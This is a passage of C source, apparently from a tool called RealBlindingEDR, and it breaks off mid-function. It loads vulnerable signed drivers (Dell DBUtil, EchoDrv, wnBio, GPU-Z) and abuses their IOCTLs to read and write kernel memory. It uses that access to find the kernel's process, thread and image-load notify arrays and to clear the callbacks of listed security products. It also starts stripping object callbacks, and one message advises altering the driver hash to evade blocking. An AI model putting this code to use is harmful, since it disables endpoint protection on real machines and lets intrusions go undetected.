#include "RealBlindingEDR.h"
HANDLE hDevice = NULL;
HANDLE Process = NULL;
DWORD dwMajor = 0;
DWORD dwMinorVersion = 0;
DWORD dwBuild = 0;
INT64 EDRIntance[500] = { 0 };
TCHAR* RandomName = NULL;

// Forward declarations (defined later in file, used inside InitialDriver)
BOOL GpuzReadPhys(DWORD64 physAddr, VOID* outBuf, DWORD size);
VOID GpuzWritePhys(DWORD64 physAddr, VOID* inBuf, DWORD size);
DWORD64 GpuzVirtToPhys(DWORD64 virtAddr);
BOOL LoadDriver() {
	HKEY hKey;
	HKEY hsubkey;
	if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet", 0, 2u, &hKey) && !RegCreateKeyW(hKey, RandomName, &hsubkey)) {
		CHAR* pdata = (CHAR*)calloc(1024, 1);
		if (pdata == NULL) return FALSE;
		memcpy(pdata, "\\??\\", strlen("\\??\\"));
		memcpy(pdata + strlen("\\??\\"), DrivePath, strlen(DrivePath));
		if (RegSetValueExA(hsubkey, "ImagePath", 0, REG_EXPAND_SZ, (PBYTE)pdata, (DWORD)(strlen(pdata) + 1))) {
			printf("Step1 Error\n");
			return FALSE;
		}
		BYTE bDwod[4] = { 0 };
		*(DWORD*)bDwod = 1;
		if (RegSetValueExA(hsubkey, "Type", 0, 4u, bDwod, 4u)) {
			printf("Step2 Error\n");
			return FALSE;
		}

		// exe: only create services subkey on Win7 (dwMajor < 10)
		if (dwMajor < 10) {
			if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\services", 0, 2u, &hKey)) {
				RegCreateKeyW(hKey, RandomName, &hsubkey);
			}
			else {
				printf("Step3 Error\n");
				return FALSE;
			}
		}
		RegCloseKey(hKey);

		HMODULE hMoudle = LoadLibraryA("ntdll.dll");
		if (hMoudle == NULL) {
			printf("Step4 Error\n");
			return FALSE;
		}
		RtlInitUnicodeStringPtr RtlInitUnicodeString = (RtlInitUnicodeStringPtr)GetProcAddress(hMoudle, "RtlInitUnicodeString");
		NtLoadDriverPtr NtLoadDriver = (NtLoadDriverPtr)GetProcAddress(hMoudle, "NtLoadDriver");
		RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hMoudle, "RtlAdjustPrivilege");
		ULONG previousState;
		NTSTATUS status = RtlAdjustPrivilege(0xa, TRUE, FALSE, &previousState);

		if (!NT_SUCCESS(status)) {
			printf("Step5 Error\n");
			return FALSE;
		}

		UNICODE_STRING szSymbolicLink;
		TCHAR LinkPath[100] = L"\\Registry\\Machine\\System\\CurrentControlSet\\";
		lstrcat(LinkPath, RandomName);
		RtlInitUnicodeString(&szSymbolicLink, LinkPath);
		INT errcode = NtLoadDriver(&szSymbolicLink);
		if (errcode >= 0)
		{
			return TRUE;
		}
		else
		{
			switch (errcode) {
			case 0xc0000603:
				printf("The driver's certificate has been revoked, please wait for the project to be updated..\n");
				break;
			case (int)0xC0000022:
				printf("[ACCESS_DENIED] Driver loading is blocked, please try to modify the driver Hash to bypass it.\n");
				break;
			case (int)0xC0000034:
				printf("[ERROR] STATUS_OBJECT_NAME_NOT_FOUND.\n");
				break;
			case (int)0xC0000428:
				printf("[ERROR] STATUS_INVALID_IMAGE_HASH.\n");
				break;
			default:
				printf("Error Code: %lx.\n", errcode);
				break;
			}
			return FALSE;
		}

	}
	else {
		printf("Reg Add Error, The program needs to be run with administrator privileges!\n");
		return FALSE;
	}
}
VOID UnloadDrive() {
	HMODULE hMoudle = LoadLibraryA("ntdll.dll");
	if (hMoudle == NULL) {
		printf("Unload Driver Error 1\n");
		return;
	}
	RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hMoudle, "RtlAdjustPrivilege");
	ULONG previousState;
	NTSTATUS status = RtlAdjustPrivilege(0xa, TRUE, FALSE, &previousState);
	if (!NT_SUCCESS(status)) {
		printf("Unload Driver Error 2\n");
		return;
	}

	RtlInitUnicodeStringPtr RtlInitUnicodeString = (RtlInitUnicodeStringPtr)GetProcAddress(hMoudle, "RtlInitUnicodeString");
	UNICODE_STRING szSymbolicLink;
	TCHAR LinkPath[100] = L"\\Registry\\Machine\\System\\CurrentControlSet\\";
	lstrcat(LinkPath, RandomName);
	RtlInitUnicodeString(&szSymbolicLink, LinkPath);
	NtUnLoadDriverPtr NtUnLoadDriver = (NtUnLoadDriverPtr)GetProcAddress(hMoudle, "NtUnloadDriver");

	int errcode = NtUnLoadDriver(&szSymbolicLink);
	if (errcode >= 0)
	{
		printf("Driver uninstalled successfully.\n");
	}
	else {
		printf("Unload Driver Error: %lx\n", errcode);
	}
}
BOOL InitialDriver() {
	//win7 加载此驱动崩溃，和后面代码逻辑无关
	if (Driver_Type == 1) {
		hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			if (LoadDriver()) {
				printf("Driver loaded successfully.\n");
				hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			}
			else {
				printf("Driver loading failed.\n");
				return FALSE;
			}
		}

		BYTE* buf = (BYTE*)malloc(1);
		DWORD bytesRet = 0;
		BOOL success = DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 1, &bytesRet, NULL);
		if (!success) {
			printf("Failed to initialize driver 1, %d\n", GetLastError());
			CloseHandle(hDevice);
			return FALSE;
		}
		Process = GetCurrentProcess();
	}
	else if (Driver_Type == 2) {
		hDevice = CreateFile(L"\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			if (LoadDriver()) {
				printf("Driver loaded successfully.\n");
				hDevice = CreateFile(L"\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			}
			else {
				printf("Driver loading failed.\n");
				return FALSE;
			}
		}
	}
	else if (Driver_Type == 3) {
		// wnBio.sys - supports Windows 6.3+
		hDevice = CreateFile(L"\\\\.\\WNBIOS", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			if (LoadDriver()) {
				printf("Driver loaded successfully.\n");
				hDevice = CreateFile(L"\\\\.\\WNBIOS", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			}
			else {
				printf("Driver loading failed.\n");
				return FALSE;
			}
		}
	}
	else if (Driver_Type == 4) {
		// GPU-Z.sys (BaiZhanTang) - only supports Windows 6.1
		// This driver uses CR3 page-table walk to access physical memory
		hDevice = CreateFile(L"\\\\.\\BaiZhanTang", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			// For GPU-Z driver, lpString2 (RandomName) is overridden to the fixed service name
			RandomName = (TCHAR*)L"BaiZhanTang";
			if (LoadDriver()) {
				printf("Driver loaded successfully.\n");
				hDevice = CreateFile(L"\\\\.\\BaiZhanTang", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			}
			else {
				printf("Driver loading failed.\n");
				return FALSE;
			}
		}
		printf("Getting CR3,Please Wait.....\n");
		// The marker string used to identify the correct physical page
		CHAR marker[32] = {};
		strcpy(marker, "BaiZhanTang-WLWZ");
		BYTE readBuf[40] = {};
		if (!g_CR3Found) {
			// Scan physical memory starting from 0x100000, step 0x1000
			// Use GpuzReadMem via sub_140004450 logic:
			// set g_CR3Base = candidate physAddr, then translate marker's virt -> phys
			DWORD64 physAddr = 0x100000;
			while (1) {
				g_CR3Base = physAddr; // qword_14002CC40 = v8
				// Try to translate the virtual address of marker[] using current CR3 candidate
				DWORD64 physMarker = GpuzVirtToPhys((DWORD64)(ULONG_PTR)marker);
				if (physMarker) {
					// Read 40 bytes from that physical address
					memset(readBuf, 0, sizeof(readBuf));
					GpuzReadPhys(physMarker, readBuf, 40);
					if (strcmp(marker, (const char*)readBuf) == 0)
						break;
				}
				physAddr += 0x1000;
				if (physAddr >= 0xFFFFFF000ULL) {
					printf("[ERROR] CR3 Not Found.\n");
					return FALSE;
				}
			}
		}
		g_CR3Found = 1;
	}
	return TRUE;
}

DWORD64 DellRead(VOID* Address) {
	struct DellBuff ReadBuff = {};
	ReadBuff.Address = (DWORD64)Address;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDevice, 0x9B0C1EC4, &ReadBuff, sizeof(ReadBuff), &ReadBuff, sizeof(ReadBuff), &BytesRead, NULL);
	if (!success) {
		printf("Memory read failed. 1\n");
		CloseHandle(hDevice);
	}
	return ReadBuff.value;
}
VOID DellWrite(VOID* Address, LONGLONG value) {
	struct DellBuff WriteBuff = {};
	WriteBuff.Address = (DWORD64)Address;
	WriteBuff.value = value;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDevice, 0x9B0C1EC8, &WriteBuff, sizeof(WriteBuff), &WriteBuff, sizeof(WriteBuff), &BytesRead, NULL);
	if (!success) {
		printf("Memory read failed. 2\n");
		CloseHandle(hDevice);
	}
}

// GPU-Z: read raw physical memory
// Mirrors sub_140004450(a1=physAddr, a2=outBuf, a3=size)
// Request: 0xC bytes = [physAddr(8)][size(4)]
// Response: 4 bytes = kernel virtual ptr
// Then memmove(outBuf, kernelPtr, size), then IOCTL 0x80006460 to unmap
BOOL GpuzReadPhys(DWORD64 physAddr, VOID* outBuf, DWORD size) {
	// Validate: must be a real physical address (from 1 to 0x3FFFFFFFF) or g_CR3Found set
	if (!g_CR3Found && (physAddr == 0 || physAddr - 1 > 0x3FFFFFFFFULL)) return FALSE;
	GPUZ_MAPREQ req = {};
	req.PhysAddr = physAddr;
	req.Size = size;
	// OutBuffer: 4 bytes returning kernel virtual pointer
	VOID* kernelPtr = NULL;
	DWORD bytesRet = 0;
	if (!DeviceIoControl(hDevice, GPUZ_IOCTL_MAPPHYS, &req, sizeof(req),
	                     &kernelPtr, sizeof(DWORD), &bytesRet, NULL)) {
		printf("Memory read failed.\n");
		CloseHandle(hDevice);
		return FALSE;
	}
	// memmove(outBuf, kernelPtr, size) then unmap
	memmove(outBuf, kernelPtr, size);
	if (!DeviceIoControl(hDevice, GPUZ_IOCTL_UNMAP, &kernelPtr, sizeof(DWORD),
	                     NULL, 0, &bytesRet, NULL)) {
		// non-fatal, just log
	}
	return TRUE;
}
// GPU-Z: write raw physical memory
// Maps phys, memmoves user->kernel, then IOCTL 0x80006460 to commit/unmap
VOID GpuzWritePhys(DWORD64 physAddr, VOID* inBuf, DWORD size) {
	if (!g_CR3Found && (physAddr == 0 || physAddr - 1 > 0x3FFFFFFFFULL)) return;
	GPUZ_MAPREQ req = {};
	req.PhysAddr = physAddr;
	req.Size = size;
	VOID* kernelPtr = NULL;
	DWORD bytesRet = 0;
	if (!DeviceIoControl(hDevice, GPUZ_IOCTL_MAPPHYS, &req, sizeof(req),
	                     &kernelPtr, sizeof(DWORD), &bytesRet, NULL)) {
		printf("Memory read failed.\n");
		CloseHandle(hDevice);
		return;
	}
	memmove(kernelPtr, inBuf, size);
	DeviceIoControl(hDevice, GPUZ_IOCTL_WRITE, &kernelPtr, sizeof(DWORD),
	               NULL, 0, &bytesRet, NULL);
}
// GPU-Z: virtual to physical address translation via CR3 page table walk
// Mirrors sub_140004570: uses GpuzReadPhys (=sub_140004450) at each paging level
DWORD64 GpuzVirtToPhys(DWORD64 virtAddr) {
	if (!g_CR3Base) return 0;
	DWORD64 pml4e = 0;
	if (!GpuzReadPhys(g_CR3Base + 8 * ((virtAddr >> 39) & 0x1FF), &pml4e, 8)) return 0;
	if (!(pml4e & 1)) return 0;
	DWORD64 pdpte = 0;
	if (!GpuzReadPhys((pml4e & 0xFFFFFFFFFF000ULL) + 8 * ((virtAddr >> 30) & 0x1FF), &pdpte, 8)) return 0;
	if (!(pdpte & 1)) return 0;
	if (pdpte & 0x80) return (pdpte & 0xFFFFFC0000000ULL) + (virtAddr & 0x3FFFFFFF);
	DWORD64 pde = 0;
	if (!GpuzReadPhys((pdpte & 0xFFFFFFFFFF000ULL) + 8 * ((virtAddr >> 21) & 0x1FF), &pde, 8)) return 0;
	if (!(pde & 1)) return 0;
	if (pde & 0x80) return (pde & 0xFFFFFFFE00000ULL) + (virtAddr & 0x1FFFFF);
	DWORD64 pte = 0;
	if (!GpuzReadPhys((pde & 0xFFFFFFFFFF000ULL) + 8 * ((virtAddr >> 12) & 0x1FF), &pte, 8)) return 0;
	if (!(pte & 1)) return 0;
	return (pte & 0xFFFFFFFFFF000ULL) + (virtAddr & 0xFFF);
}

// wnBio: read/write kernel virtual memory
// Mirrors sub_140004790(a1=kernelVirt, a2=size, a3=userBuf, a4=0=read/1=write)
// Buffer layout: [0]=size [1]=kernelVirtAddr (0x28 = 5*8 bytes total)
// Response:      [2]=VirtPage [3]=KernelPtr [4]=MapSize
// Then memmove(kernelPtr or userBuf depending on direction)
// Then IOCTL 0x80102044 with {[3]=KernelPtr,[2]=VirtPage,[4]=MapSize} to unmap
BOOL WnBioReadWrite(DWORD64 kernelAddr, VOID* userBuf, DWORD size, BOOL bWrite) {
	WNBIO_MAPBUFF* buf = (WNBIO_MAPBUFF*)calloc(0x28, 1);
	if (!buf) return FALSE;
	buf->Size = size;        // buf[0] = size
	buf->KernelAddr = kernelAddr; // buf[1] = kernel virt address
	DWORD bytesRet = 0;
	if (!DeviceIoControl(hDevice, WNBIO_IOCTL_READ, buf, 0x28, buf, 0x28, &bytesRet, NULL)) {
		DWORD err = GetLastError();
		printf("Memory read failed.%d\n", err);
		CloseHandle(hDevice);
		free(buf);
		return FALSE;
	}
	// v14 = buf[3] = KernelPtr (the actual pointer to kernel data)
	// v9  = buf[2] = VirtPage
	// v6  = buf[4] = MapSize
	INT64 v14 = (INT64)buf->KernelPtr;   // buf[3]
	INT64 v9  = (INT64)buf->VirtPage;    // buf[2]
	INT64 v6  = (INT64)buf->MapSize;     // buf[4]
	if (v14) {
		if (!bWrite) {
			// read: memmove(userBuf, kernelPtr, size)
			memmove(userBuf, (VOID*)v14, size);
		} else {
			// write: memmove(kernelPtr, userBuf, size)
			memmove((VOID*)v14, userBuf, size);
		}
	}
	// Build unmap request: v17[3]=v14, v17[2]=v9, v17[4]=v6
	WNBIO_MAPBUFF* ubuf = (WNBIO_MAPBUFF*)calloc(0x28, 1);
	if (ubuf) {
		ubuf->KernelPtr = (ULONGLONG)v14;  // [3]
		ubuf->VirtPage  = (ULONGLONG)v9;   // [2]
		ubuf->MapSize   = (ULONGLONG)v6;   // [4]
		if (!DeviceIoControl(hDevice, WNBIO_IOCTL_WRITE, ubuf, 0x28, ubuf, 0x28, &bytesRet, NULL)) {
			printf("Memory read failed.\n");
			CloseHandle(hDevice);
		}
		free(ubuf);
	}
	free(buf);
	return TRUE;
}

VOID DriverWriteMemery(VOID* fromAddress, VOID* toAddress, size_t len) {
	if (Driver_Type == 1) {
		ReadMem* req = (ReadMem*)malloc(sizeof(ReadMem));
		if (!req) return;
		req->fromAddress = fromAddress;
		req->length = len;
		req->targetProcess = Process;
		req->toAddress = toAddress;
		DWORD bytesRet = 0;
		BOOL success = DeviceIoControl(hDevice, 0x60a26124, req, sizeof(ReadMem), req, sizeof(ReadMem), &bytesRet, NULL);
		if (!success) {
			printf("Memory read failed.\n");
			CloseHandle(hDevice);
		}
		free(req);
	}
	else if (Driver_Type == 2) {
		if (len == 8) {
			INT64 dataAddr = DellRead(fromAddress);
			DellWrite(toAddress, dataAddr);
		}
		else {
			BYTE* btoAddress = (BYTE*)toAddress;
			for (size_t i = 0; i < len; i++) {
				btoAddress[i] = (BYTE)DellRead((VOID*)((DWORD64)fromAddress + i));
			}
		}
	}
	else if (Driver_Type == 3) {
		// wnBio.sys: mirrors sub_140004BD0 case 3
		// if len==8 or len!=1: use sub_1400048E0 (virt->phys lookup) + sub_140004790
		// if len==1 and fromAddr is kernel (hi bits==0xFFFF...): also use virt->phys
		// else: plain memmove (user->user copy)
		DWORD64 fromHi = (DWORD64)fromAddress & 0xFFFF000000000000ULL;
		DWORD64 toHi   = (DWORD64)toAddress   & 0xFFFF000000000000ULL;
		if (len == 8 || len != 1) {
			// Translate fromAddress virtual -> physical, then read
			BYTE* tmp = (BYTE*)calloc(len, 1);
			if (!tmp) return;
			// If fromAddr is kernel space
			if (fromHi == 0xFFFF000000000000ULL) {
				WnBioReadWrite((DWORD64)fromAddress, tmp, (DWORD)len, FALSE);
			} else {
				memmove(tmp, fromAddress, len);
			}
			// If toAddr is kernel space
			if (toHi == 0xFFFF000000000000ULL) {
				WnBioReadWrite((DWORD64)toAddress, tmp, (DWORD)len, TRUE);
			} else {
				memmove(toAddress, tmp, len);
			}
			free(tmp);
		}
		else {
			// len == 1: plain copy between user buffers
			memmove(toAddress, fromAddress, len);
		}
	}
	else if (Driver_Type == 4) {
		// GPU-Z.sys: mirrors sub_140004BD0 case 4
		// if len==8: sub_140004570(from)->phys, sub_140004450 read, GPU-Z write IOCTL
		// else: sub_140004570(from)->phys, sub_140004450 read/write
		if (len == 8) {
			// Read 8 bytes from fromAddress (kernel virt)
			DWORD64 fromPhys = GpuzVirtToPhys((DWORD64)fromAddress);
			DWORD64 tmp = 0;
			if (fromPhys) GpuzReadPhys(fromPhys, &tmp, 8);
			// Write 8 bytes to toAddress (kernel virt)
			DWORD64 toPhys = GpuzVirtToPhys((DWORD64)toAddress);
			if (toPhys) GpuzWritePhys(toPhys, &tmp, 8);
		}
		else {
			// len != 8: read from virt, write to virt
			DWORD64 fromPhys = GpuzVirtToPhys((DWORD64)fromAddress);
			BYTE* tmp = (BYTE*)calloc(len + 1, 1);
			if (!tmp) return;
			if (fromPhys) GpuzReadPhys(fromPhys, tmp, (DWORD)len);
			DWORD64 toPhys = GpuzVirtToPhys((DWORD64)toAddress);
			if (toPhys) GpuzWritePhys(toPhys, tmp, (DWORD)len);
			free(tmp);
		}
	}
}

BOOL IsEDR(CHAR* DriverName) {
	DWORD isEDR = FALSE;
	INT i = 0;
	while (AVDriver[i] != NULL) {
		if (stricmp(DriverName, AVDriver[i]) == 0) {
			isEDR = TRUE;
			break;
		}
		i++;
	}
	return isEDR;
}

PVOID GetModuleBase(CHAR* Name) {
	PRTL_PROCESS_MODULES ModuleInfo = (PRTL_PROCESS_MODULES)calloc(1024 * 1024, 1);
	if (ModuleInfo == NULL) return 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, ModuleInfo, 1024 * 1024, NULL);
	if (!NT_SUCCESS(status)) {
		return 0;
	}

	for (ULONG i = 0; i < ModuleInfo->NumberOfModules; i++)
	{
		if (lstrcmpiA((LPCSTR)(ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName), Name) == 0) {

			return ModuleInfo->Modules[i].ImageBase;
		}
	}
	return 0;
}
INT64 GetFuncAddress(CHAR* ModuleName, CHAR* FuncName) {
	PVOID KBase = GetModuleBase(ModuleName);
	if (KBase == 0) {
		printf("ntoskrnl.exe base address not found.\n");
		return 0;
	}
	HMODULE ntos = NULL;
	if (strcmp(ModuleName, "FLTMGR.sys") == 0) {
		CHAR FullModuleName[100] = "C:\\windows\\system32\\drivers\\";
		lstrcatA(FullModuleName, ModuleName);
		ntos = LoadLibraryExA(FullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
	}
	else {
		ntos = LoadLibraryA(ModuleName);
	}
	if (ntos == NULL) return 0;
	VOID* PocAddress = (VOID*)GetProcAddress(ntos, FuncName);
	INT64 Offset = (INT64)PocAddress - (INT64)ntos;
	return (INT64)KBase + Offset;
}

INT64 GetPspNotifyRoutineArray(CHAR* KernelCallbackRegFunc) {

	INT64 PsSetCallbacksNotifyRoutineAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", KernelCallbackRegFunc);
	if (PsSetCallbacksNotifyRoutineAddress == 0) return 0;

	INT count = 0;
	INT64 PspSetCallbackssNotifyRoutineAddress = 0;
	UINT64 PspOffset = 0;
	BYTE* buffer = (BYTE*)malloc(1);
	if (buffer == NULL) return 0;
	if (dwMajor >= 10 || (dwMajor == 6 && strcmp(KernelCallbackRegFunc, "PsSetCreateProcessNotifyRoutine") == 0)) {
		while (1) {
			DriverWriteMemery((VOID*)PsSetCallbacksNotifyRoutineAddress, buffer, 1);
			if (*buffer == 0xE8 || *buffer == 0xE9) {
				break;
			}
			PsSetCallbacksNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress + 1;
			if (count == 200) {
				printf("%s: The first level CALL/JMP instruction was not found.\n", KernelCallbackRegFunc);
				return 0;
			}
			count++;
		}

		for (int i = 4, k = 24; i > 0; i--, k = k - 8) {

			DriverWriteMemery((VOID*)(PsSetCallbacksNotifyRoutineAddress + i), buffer, 1);
			PspOffset = ((UINT64)*buffer << k) + PspOffset;
		}
		if ((PspOffset & 0x00000000ff000000) == 0x00000000ff000000)
			PspOffset = PspOffset | 0xffffffff00000000; 

		PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress + PspOffset + 5;
		//printf("PspSetCallbackssNotifyRoutineAddress: %I64x\n", PspSetCallbackssNotifyRoutineAddress);
		
	}
	else if (dwMajor == 6) {
		PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress;
	}
	else {
		printf("Unsupported operating system version.\n");
		return 0;
	}
	
	BYTE SearchByte1 = 0x4C;
	BYTE SearchByte1_1 = 0x48;
	BYTE SearchByte2 = 0x8D;
	BYTE bArray[3] = { 0 };
	count = 0;
	while (count <= 200) {
		DriverWriteMemery((VOID*)PspSetCallbackssNotifyRoutineAddress, bArray, 3);
		if (bArray[0] == SearchByte1 && bArray[1] == SearchByte2) {
			if ((bArray[2] == 0x0D) || (bArray[2] == 0x15) || (bArray[2] == 0x1D) || (bArray[2] == 0x25) || (bArray[2] == 0x2D) || (bArray[2] == 0x35) || (bArray[2] == 0x3D))
			{
				break;
			}
		}
		else if (bArray[0] == SearchByte1_1 && bArray[1] == SearchByte2) { //2008R2
			if ((bArray[2] == 0x0D) || (bArray[2] == 0x15) || (bArray[2] == 0x1D) || (bArray[2] == 0x25) || (bArray[2] == 0x2D) || (bArray[2] == 0x35) || (bArray[2] == 0x3D))
			{
				break;
			}
		}

		PspSetCallbackssNotifyRoutineAddress = PspSetCallbackssNotifyRoutineAddress + 1;
		if (count == 200)
		{
			printf("%s:The second level LEA instruction was not found and the PspSetCallbackssNotifyRoutineAddress array could not be located.\n", KernelCallbackRegFunc);
			return 0;
		}
		count++;
	}
	//printf("PspSetCallbackssNotifyRoutineAddress:%I64x\n", PspSetCallbackssNotifyRoutineAddress);
	PspOffset = 0;
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(PspSetCallbackssNotifyRoutineAddress + i), buffer, 1);
		PspOffset = ((UINT64)*buffer << k) + PspOffset;
	}
	if ((PspOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PspOffset = PspOffset | 0xffffffff00000000;

	INT64 PspNotifyRoutineArrayAddress = PspSetCallbackssNotifyRoutineAddress + PspOffset + 7;

	return PspNotifyRoutineArrayAddress;
}
CHAR* GetDriverName(INT64 DriverCallBackFuncAddr) {
	DWORD bytesNeeded = 0;
	if (EnumDeviceDrivers(NULL, 0, &bytesNeeded)) {
		DWORD ArraySize = bytesNeeded / 8;
		DWORD ArraySizeByte = bytesNeeded;
		INT64* addressArray = (INT64*)malloc(ArraySizeByte);
		if (addressArray == NULL) return NULL;
		EnumDeviceDrivers((LPVOID*)addressArray, ArraySizeByte, &bytesNeeded);
		INT64* ArrayMatch = (INT64*)malloc(ArraySizeByte + 100);
		if (ArrayMatch == NULL) return NULL;
		INT j = 0;
		for (DWORD i = 0; i < ArraySize - 1; i++) {
			// && (DriverCallBackFuncAddr < addressArray[i + 1])
			if ((DriverCallBackFuncAddr > (INT64)addressArray[i])) {
				ArrayMatch[j] = addressArray[i];
				j++;
			}
		}
		INT64 tmp = 0;
		INT64 MatchAddr = 0;
		for (int i = 0; i < j; i++) {
			if (i == 0) {
				tmp = _abs64(DriverCallBackFuncAddr - ArrayMatch[i]);
				MatchAddr = ArrayMatch[i];

			}
			else if (_abs64(DriverCallBackFuncAddr - ArrayMatch[i]) < tmp) {
				tmp = _abs64(DriverCallBackFuncAddr - ArrayMatch[i]);
				MatchAddr = ArrayMatch[i];
			}
		}

		CHAR* DriverName = (CHAR*)calloc(1024, 1);
		if (GetDeviceDriverBaseNameA((LPVOID)MatchAddr, DriverName, 1024) > 0) {
			//printf("%I64x\t%s", MatchAddr,DriverName);
			return DriverName;

		}
		free(addressArray);
		free(ArrayMatch);
		free(DriverName);
	}
	return NULL;
}
VOID PrintAndClearCallBack(INT64 PspNotifyRoutineAddress, CHAR* CallBackRegFunc) {
	INT64 buffer = 0;
	printf("----------------------------------------------------\n");
	printf("Register driver for %s callback: \n----------------------------------------------------\n\n", CallBackRegFunc);
	BYTE* data = (BYTE*)calloc(8, 1);
	for (int k = 0; k < 64; k++)
	{
		DriverWriteMemery((VOID*)(PspNotifyRoutineAddress + (k * 8)), &buffer, 8);
		if (buffer == 0) continue;
		INT64 tmpaddr = ((INT64)buffer >> 4) << 4;
		if (tmpaddr == 0) continue;
		DriverWriteMemery((VOID*)(tmpaddr + 8), &buffer, 8);
		INT64 DriverCallBackFuncAddr = (INT64)buffer;
		CHAR* DriverName = GetDriverName(DriverCallBackFuncAddr);
		if (DriverName != NULL) {
			printf("%s", DriverName);
			if (IsEDR(DriverName)) {
				DriverWriteMemery(data, (VOID*)(PspNotifyRoutineAddress + (k * 8)), 8);
				printf("\t[Clear]\n");
			}
			else {
				printf("\n");
			}
		}
	}
	printf("\n");
}
VOID ClearThreeCallBack() {
	INT64 PspCreateProcessNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateProcessNotifyRoutine");
	INT64 PspCreateThreadNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateThreadNotifyRoutine");
	INT64 PspLoadImageNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetLoadImageNotifyRoutine");

	if (PspCreateProcessNotifyRoutineAddress) {
		PrintAndClearCallBack(PspCreateProcessNotifyRoutineAddress, (CHAR*)"PsSetCreateProcessNotifyRoutine");
	}
	else {
		printf("Failed to obtain process callback address.\n");
	}
	if (PspCreateThreadNotifyRoutineAddress) {
		PrintAndClearCallBack(PspCreateThreadNotifyRoutineAddress, (CHAR*)"PsSetCreateThreadNotifyRoutine");
	}
	else {
		printf("Failed to obtain thread callback address.\n");
	}
	if (PspLoadImageNotifyRoutineAddress) {
		PrintAndClearCallBack(PspLoadImageNotifyRoutineAddress, (CHAR*)"PsSetLoadImageNotifyRoutine");
	}
	else {
		printf("Image loading callback address acquisition failed.\n");
	}

	return;

}

INT64 GetPsProcessAndProcessTypeAddr(INT flag) {
	INT64 FuncAddress = 0;
	if (flag == 1) {
		FuncAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"NtDuplicateObject");
	}
	else if (flag == 2) {
		FuncAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"NtQueryInformationThread");
	}
	if (FuncAddress == 0) return 0;

	BYTE* buffer = (BYTE*)calloc(3, 1);
	if (buffer == 0) return 0;
	INT count = 0;
	while (1) {
		DriverWriteMemery((VOID*)FuncAddress, buffer, 3);
		if (buffer[0] == 0x4c && buffer[1] == 0x8b && buffer[2] == 0x05) {
			break;
		}
		FuncAddress = FuncAddress + 1;
		if (count == 600) {
			printf("PsProcessTyped or PsThreadType address not found.\n");
			return 0;
		}
		count++;
	}
	UINT64 PsOffset = 0;
	BYTE tmp[1] = { 0 };
	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {

		DriverWriteMemery((VOID*)(FuncAddress + i), tmp, 1);
		PsOffset = ((UINT64)tmp[0] << k) + PsOffset;
	}
	if ((PsOffset & 0x00000000ff000000) == 0x00000000ff000000)
		PsOffset = PsOffset | 0xffffffff00000000;
	INT64 PsProcessTypePtr = FuncAddress + 7 + PsOffset;
	INT64 PsProcessTypeAddr = 0;
	DriverWriteMemery((VOID*)PsProcessTypePtr, &PsProcessTypeAddr, 8);
	return PsProcessTypeAddr;
}
VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
	INT64 CallbackListAddr = 0;
	if (dwMajor >= 10) {
		CallbackListAddr = PsProcessTypeAddr + 0xC8;
	}
	else if (dwMajor == 6) {
		if (dwMinorVersion == 3) {//2012R2
			CallbackListAddr = PsProcessTypeAddr + 0xC8;
		}
		else {
			CallbackListAddr = PsProcessTypeAddr + 0xC0;
		}
	}
	else {
		printf("Operating systems not supported by ObRegisterCallbacks.\n");
		return;
	}

	if (flag == 1) printf("Process:\n");
	else           printf("Thread:\n");

	INT64 Src = 0;  // 8 bytes of zeros on stack, used as clear source
	INT64 CurFlink = 0;
	DriverWriteMemery((VOID*)CallbackListAddr, &CurFlink, 8);

	INT idx = 0;
	while (CurFlink != CallbackListAddr) {
		printf("[%d]", idx);

		// Read PreOperation callback function pointer
		INT64 EDRPreOperation = 0;
